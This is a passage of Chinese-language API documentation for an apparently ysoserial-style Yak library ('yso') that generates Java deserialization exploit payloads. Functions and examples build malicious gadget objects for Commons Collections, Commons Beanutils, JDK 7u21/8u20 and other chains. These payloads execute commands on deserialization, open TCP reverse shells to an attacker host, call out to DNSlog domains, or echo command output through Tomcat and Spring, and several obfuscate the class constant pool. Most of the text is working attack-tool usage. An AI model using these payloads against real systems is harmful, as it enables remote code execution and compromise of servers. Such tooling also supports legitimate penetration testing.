bodyClassObj, _ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(), yso.useEchoBody(), yso.useParam("Body Echo Check"))
``````````````

**示例：Tomcat 模板的 header 回显**

``````````````yak
headerClassObj, _ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(), yso.useHeaderParam("Echo", "Header Echo Check"))
``````````````

---

## 可变参数函数详情

### GenerateClass {#generateclass}

```go
GenerateClass(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

根据提供的配置选项生成一个Java类对象。

这个函数是生成各种类型Java类对象的核心函数，它可以处理原始字节码类型和预定义的类模板。

对于原始字节码类型(ClassRaw)，它直接解析提供的模板；对于其他类型，它从YsoConfigInstance中加载相应的类模板并应用参数。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组 GenClassOptionFun 函数，用于配置生成的类对象的各种属性 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
// 使用原始字节码生成类对象
classObj, err := yso.GenerateClass(yso.SetClassBytes(bytecode))

// 使用预定义模板生成类对象
classObj, err := yso.GenerateClass(yso.SetClassType(ClassRuntimeExec), yso.SetExecCommand("whoami"))
``````````````

---

### GenerateClassObjectFromBytes {#generateclassobjectfrombytes}

```go
GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

从字节数组中加载并返回一个javaclassparser.ClassObject对象。

LoadClassFromBytes、LoadClassFromBase64、LoadClassFromBCEL等函数都是基于这个函数实现的。

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| bytes | `[]byte` | 要从中加载类对象的字节数组 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置类对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
bytesCode,_ =codec.DecodeBase64("yv66vg...")
classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
``````````````

---

### GenerateDNSlogEvilClassObject {#generatednslogevilclassobject}

```go
GenerateDNSlogEvilClassObject(domain string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

GenDnslogClassObject

GenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象，

并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dnslogDomain 函数，

以生成在反序列化时会向指定的 Dnslog 域名发送请求的Java对象。

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| domain | `string` | 要在生成的Java对象中请求的 Dnslog 域名 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
domain := "dnslog.com" // 假设的 Dnslog 域名
classObject, err := yso.GenerateDnslogEvilClassObject(domain, additionalOptions...) // 生成并配置Dnslog Java对象
``````````````

---

### GenerateHeaderEchoClassObject {#generateheaderechoclassobject}

```go
GenerateHeaderEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

GenHeaderEchoClassObject

GenerateHeaderEchoClassObject 生成一个使用HeaderEcho类模板的javaclassparser.ClassObject对象，

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
headerClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
``````````````

---

### GenerateModifyTomcatMaxHeaderSizeEvilClassObject {#generatemodifytomcatmaxheadersizeevilclassobject}

```go
GenerateModifyTomcatMaxHeaderSizeEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useModifyTomcatMaxHeaderSizeTemplate 函数， 以生成在反序列化时会修改 tomcat 的 MaxHeaderSize 值的Java对象。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
classObject, err := yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject() // 生成并配置ModifyTomcatMaxHeaderSize Java对象
``````````````

---

### GenerateMultiEchoClassObject {#generatemultiechoclassobject}

```go
GenerateMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

GenMultiEchoClassObject

GenerateMultiEchoEvilClassObject 生成一个使用 MultiEcho 类模板的javaclassparser.ClassObject对象，主要用于 Tomcat/Weblogic 回显，

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例：生成 MultiEcho 回显类对象的 body 回显**

``````````````yak
bodyClassObj, _ = yso.GenerateMultiEchoEvilClassObject(yso.useEchoBody(), yso.useParam("Body Echo Check"))
``````````````

**示例：生成 MultiEcho 回显类对象的 header 回显**

``````````````yak
headerClassObj, _ = yso.GenerateMultiEchoEvilClassObject(yso.useHeaderParam("Echo", "Header Echo Check"))
``````````````

---

### GenerateProcessBuilderExecEvilClassObject {#generateprocessbuilderexecevilclassobject}

```go
GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象，

并设置一个指定的命令来执行。这个函数结合使用SetClassProcessBuilderExecTemplate和SetExecCommand函数，

以生成在反序列化时会执行特定命令的Java对象。

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要在生成的Java对象中执行的命令字符串 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
classObject, err := yso.GenerateProcessBuilderExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessBuilderExec Java对象
``````````````

---

### GenerateProcessImplExecEvilClassObject {#generateprocessimplexecevilclassobject}

```go
GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象，

并设置一个指定的命令来执行。这个函数结合使用SetClassProcessImplExecTemplate和SetExecCommand函数，

以生成在反序列化时会执行特定命令的Java对象。

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要在生成的Java对象中执行的命令字符串 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
classObject, err := yso.GenerateProcessImplExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessImplExec Java对象
``````````````

---

### GenerateRuntimeExecEvilClassObject {#generateruntimeexecevilclassobject}

```go
GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

生成一个使用RuntimeExec类模板的javaclassparser.ClassObject对象，

并设置一个指定的命令来执行。这个函数结合使用SetClassRuntimeExecTemplate和SetExecCommand函数，

以生成在反序列化时会执行特定命令的Java对象。

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要在生成的Java对象中执行的命令字符串 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
classObject, err := yso.GenerateRuntimeExecEvilClassObject(command, additionalOptions...) // 生成并配置RuntimeExec Java对象
``````````````

---

### GenerateSleepClassObject {#generatesleepclassobject}

```go
GenerateSleepClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

GenSleepClassObject

GenerateSleepClassObject 生成一个使用Sleep类模板的javaclassparser.ClassObject对象

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
yso.GenerateSleepClassObject(yso.useSleepTime(5))
``````````````

---

### GenerateSpringEchoEvilClassObject {#generatespringechoevilclassobject}

```go
GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内容的Java对象。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check")) // 生成并配置SpringEcho Java对象
``````````````

---

### GenerateTcpReverseEvilClassObject {#generatetcpreverseevilclassobject}

```go
GenerateTcpReverseEvilClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

GenTcpReverseClassObject

GenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 函数， 以生成在反序列化时会反连指定的 tcpReverseHost ，tcpReversePort 的Java对象。

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| host | `string` | 要设置的 tcpReverseHost 的 host |
| port | `int` | 要设置的 tcpReversePort 的 port |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
host = "公网IP"
token = uuid()
classObject, err := yso.GenerateTcpReverseEvilClassObject(host,8080,yso.tcpReverseToken(token),additionalOptions...) // 生成并配置TcpReverse Java对象
``````````````

---

### GenerateTcpReverseShellEvilClassObject {#generatetcpreverseshellevilclassobject}

```go
GenerateTcpReverseShellEvilClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

GenTcpReverseShellClassObject

GenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useTcpReverseShellTemplate ，tcpReverseShellHost ，tcpReverseShellPort 函数， 以生成在反序列化时会反连指定的 tcpReverseShellHost ，tcpReverseShellPort 的Java对象。

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| host | `string` | 要设置的 tcpReverseShellHost 的 host |
| port | `int` | 要设置的 tcpReverseShellPort 的 port |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
host = "公网IP"
classObject, err := yso.GenerateTcpReverseShellEvilClassObject(host,8080,additionalOptions...) // 生成并配置TcpReverseShell Java对象
``````````````

---

### GenerateTomcatEchoClassObject {#generatetomcatechoclassobject}

```go
GenerateTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

GenTomcatEchoClassObject

GenerateTomcatEchoEvilClassObject 生成一个使用TomcatEcho类模板的javaclassparser.ClassObject对象，

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例：生成 Tomcat 回显类对象的 body 回显**

``````````````yak
bodyClassObj, _ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(), yso.useParam("Body Echo Check"))
``````````````

**示例：生成 Tomcat 回显类对象的 header 回显**

``````````````yak
headerClassObj, _ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam("Echo", "Header Echo Check"))
``````````````

---

### GetClick1JavaObject {#getclick1javaobject}

```go
GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Click1 序列化模板生成并返回一个Java对象。

用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数允许用户定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetClick1JavaObject(

	yso.useRuntimeExecEvilClass(command),
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className),
	)
``````````````

---

### GetCommonsBeanutils183NOCCJavaObject {#getcommonsbeanutils183noccjavaobject}

```go
GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。

去除了对 commons-collections:3.1 的依赖。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetCommonsBeanutils192NOCCJavaObject {#getcommonsbeanutils192noccjavaobject}

```go
GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。

去除了对 commons-collections:3.1 的依赖。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetCommonsBeanutils1JavaObject {#getcommonsbeanutils1javaobject}

```go
GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(

	 yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
		yso.obfuscationClassConstantPool(),
		yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetCommonsCollections2JavaObject {#getcommonscollections2javaobject}

```go
GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections2JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetCommonsCollections3JavaObject {#getcommonscollections3javaobject}

```go
GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections3JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetCommonsCollections4JavaObject {#getcommonscollections4javaobject}

```go
GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections4JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetCommonsCollections8JavaObject {#getcommonscollections8javaobject}

```go
GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections8JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetCommonsCollectionsK1JavaObject {#getcommonscollectionsk1javaobject}

```go
GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Commons Collections &lt;=3.2.1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetCommonsCollectionsK2JavaObject {#getcommonscollectionsk2javaobject}

```go
GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetGadget {#getgadget}

```go
GetGadget(name string, opts ...any) (*JavaObject, error)
```

GenerateGadget this is a highly flexible function that can generate a Java object by three different ways:

 1. Generate a Java object that have no any params.

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| name | `string` | gadget 名称，例如 &#34;CommonsCollections1&#34; |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| opts | `...any` | 可变参数，可为类名/参数字符串、参数 map 或 GenClassOptionFun 配置项 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
javaObject, err := yso.GetGadget("CommonsCollections1", "dnslog", "xxx.dnslog.cn")
``````````````

---

### GetJBossInterceptors1JavaObject {#getjbossinterceptors1javaobject}

```go
GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于JBossInterceptors1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJBossInterceptors1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetJSON1JavaObject {#getjson1javaobject}

```go
GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于JSON1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJSON1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetJavassistWeld1JavaObject {#getjavassistweld1javaobject}

```go
GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于JavassistWeld1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJavassistWeld1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetJdk7u21JavaObject {#getjdk7u21javaobject}

```go
GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Jdk7u21 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJdk7u21JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

### GetJdk8u20JavaObject {#getjdk8u20javaobject}

```go
GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error)
```

基于Jdk8u20 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJdk8u20JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````

---

